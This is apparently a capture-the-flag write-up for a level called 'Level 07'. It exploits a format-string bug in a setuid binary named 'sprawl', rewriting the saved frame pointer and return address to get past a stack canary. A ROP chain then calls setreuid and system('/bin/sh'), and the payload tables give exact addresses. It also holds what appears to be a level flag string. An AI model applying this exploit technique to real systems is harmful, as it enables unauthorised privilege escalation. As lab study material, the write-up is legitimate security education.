# Level 07

c1t0kg9pklac7x4c7sn7iqgfppkz4usq

## Description

```
$ ls -l
total 20
-rwsr-x--- 1 flag07 level07 16608 Jun  9 23:13 sprawl
```

No source code.

```
readelf -l sprawl
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
     
```

Stack is not executable, so we'll need to perform a ret2libc.

## Sprawl program

### Trying buffer overflow

```
printf "a%.0s" {1..2000} | ./sprawl 
  [THE SPRAWL] BostonAtlantaNewYork online.
  [SPRAWL] Packet relay node v4.2
[SPRAWL] Route tag: [SPRAWL] Routing via aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[SPRAWL] Header (hex): [SPRAWL] Invalid header.
```

Nothing, input seem protected

### Trying printf format string


```
echo '%6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p %21$p %22$p %23$p %24$p %25$p' | ./sprawl
```

Output
```
[SPRAWL] Route tag: [SPRAWL] Routing via 0x3532252070243625 0x4016d0
```


Okay, format string exploit seems the proper way.

Let's measure the size of the available buffer for format string.

```
echo '%6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p %21$p %22$p %23$p %24$p %25$p %26$p %27$p %28$p %29$p' | ./sprawl
```

Output
```
[SPRAWL] Route tag: [SPRAWL] Routing via 0x2437252070243625 0x2520702438252070 0x2430312520702439 0x2070243131252070 0x3125207024323125 0x2434312520702433 0x2070243531252070 0x3125207024363125 0x2438312520702437 0x2070243931252070 0x3225207024303225 0x2432322520702431 0x2070243332252070 0x3225207024343225 0x2436322520702435 0x70243732252070 (nil) 0x799a5954b4dd6400 0x7fffffffe2b0 0x4016d0 0x7fffffffe390 0x799a5954b4dd6400[SPRAWL] Header (hex): [SPRAWL] Invalid header.
```

We have `16` stack addresses dedicated to storing the format string, so we have a buffer size of `16 * 8 = 0x80`.

This may be enough to replicate the `ex04` exploit using a single buffer for both storing the rop chain et exploiting the format string.

**Other hints given by format string output**
- `%23$p` shows a random value that changes accross run, so the binary seems to be protected by stack canary.
  
Based on previous output and using the format string to retrieve additionnal address, we can't reconstruct the stack layout at time of the vulnerable `printf()` call.

| Stack address    | printf()'s $rbp offset | Value | Description
| -------- | ------- | ------- | --- |
| 0x7fffffffecf0 | +0xc0 | 0x7fffffffed90 | main saved rbp (_start $rbp) 
| 0x7fffffffece8 | +0xb8 | 0x799a5954b4dd6400 | stack canary
| 0x7fffffffece0 | +0xb0 | 0x7fffffffedd0 | local ?
| 0x7fffffffecd8 | +0xa8 | 0x4016d0 | main return address
| 0x7fffffffecd0 | +0xa0 | 0x7fffffffecf0 | func saved rbp (main $rbp)
| 0x7fffffffecc8 | +0x98 | 0x799a5954b4dd6400 | stack canary
| 0x7fffffffecc0 | +0x90 | 0x00 | local ?
| 0x7fffffffec40 | +0x10 | "%6$p ..." | format string content
| 0x7fffffffec38 | +0x08 | ? | func return
| 0x7fffffffec30 | $rbp | 0x7fffffffecd0 | printf saved rbp (func $rbp)

## The exploit

### Overwrite saved rbp address

The idea is to replicate the exploit from `ex04`. That is, store a target address + the ROP chain inside a buffer and use the printf `%n` flag to write to the target address the desired fake frame start (which is actually the address before the start of the ROP chain).

Only, this time, we'll only use a single buffer for both operation:
- storing the target address + the ROP chain
- expanding the printf `%n` flag to erase the return address

This would give us :

| Address         | Printf arg | Content                        | Description                          |
|-----------------|------------|---------------------------------|---------------------------------------|
| 0x7fffffffec40  | %6$        | `%8$080p%8$hhn123`              | Write low byte of 0x7fffffffec50 (0x50) at `%8$` target |
| 0x7fffffffec50  | %8$       | `0x7fffffffecd0`                 | Target: saved rbp slot (f0 → 50) |
| 0x7fffffffec58  | %9$       | `0x7ffff7d0f84b` (pop rdi; ret)   | pop rdi |
| 0x7fffffffec60  | %10$       | `1024`                            | rdi = 1024 (ruid) |
| 0x7fffffffec68  | %11$       | `0x7ffff7d10b3d` (pop rsi; ret)   | pop rsi |
| 0x7fffffffec70  | %12$       | `1024`                            | rsi = 1024 (euid) |
| 0x7fffffffec78  | %13$       | `0x7ffff7d27330` (setreuid)       | setreuid(1024, 1024) |
| 0x7fffffffec80  | %14$       | `0x7ffff7d0f84b` (pop rdi; ret)   | pop rdi |
| 0x7fffffffec88  | %15$       | `0x7ffff7dcc42f`                  | rdi = "/bin/sh" |
| 0x7fffffffec90  | %16$       | `0x7ffff7c58750` (system)         | system("/bin/sh") |

However, this would not be enough **because of the stack canary**.

### Overwrite the main return address to skip stack canary check

When returning to main, the new rbp will be the one of our fake frame. And the stack canary check will expect this frame to contain the correct stack canary. But as everything is performed in a single printf call, resolving the canary at runtime is not an option.

To bypass the canary check, we need to also overrides the return address.

The address override is done using the 48 first bytes of the payload (32 bytes for the format string and 16 bytes to store the targeted addresses).

Then comes the ROP chain, over  72 bytes.
Because the rbp of the reconstucted frame is not 16-byte aligned, we need to add a `ret gadget` to align the stack and prevent crash from subsequent libc function call.

### Payload content

| Address         | Printf arg | Content                        | Description                          |
|-----------------|------------|---------------------------------|---------------------------------------|
| 0x7fffffffec40  | %6$        | `%10$0104p%10$hhn`              | Write low byte of 0x7fffffffec68 (0x68) at `%10$` target |
| 0x7fffffffec50  | %8$        | `%11$0139p%11$hhn`              | Write low byte of 0x4016f3 (0xf3) at `%11$` target |
| 0x7fffffffec60  | %10$       | `0x7fffffffecd0`                 | Target: saved rbp slot (f0 → 68) |
| 0x7fffffffec68  | %11$       | `0x7fffffffecd8`                 | Target: main return address slot (d0 → f3) |
| 0x7fffffffec70  | %12$       | `0x7ffff7d0f84c` (ret)            | Alignment fix |
| 0x7fffffffec78  | %13$       | `0x7ffff7d0f84b` (pop rdi; ret)   | pop rdi |
| 0x7fffffffec80  | %14$       | `1024`                            | rdi = 1024 (ruid) |
| 0x7fffffffec88  | %15$       | `0x7ffff7d10b3d` (pop rsi; ret)   | pop rsi |
| 0x7fffffffec90  | %16$       | `1024`                            | rsi = 1024 (euid) |
| 0x7fffffffec98  | %17$       | `0x7ffff7d27330` (setreuid)       | setreuid(1024, 1024) |
| 0x7fffffffeca0  | %18$       | `0x7ffff7d0f84b` (pop rdi; ret)   | pop rdi |
| 0x7fffffffeca8  | %19$       | `0x7ffff7dcc42f`                  | rdi = "/bin/sh" |
| 0x7fffffffecb0  | %20$       | `0x7ffff7c58750` (system)         | system("/bin/sh") |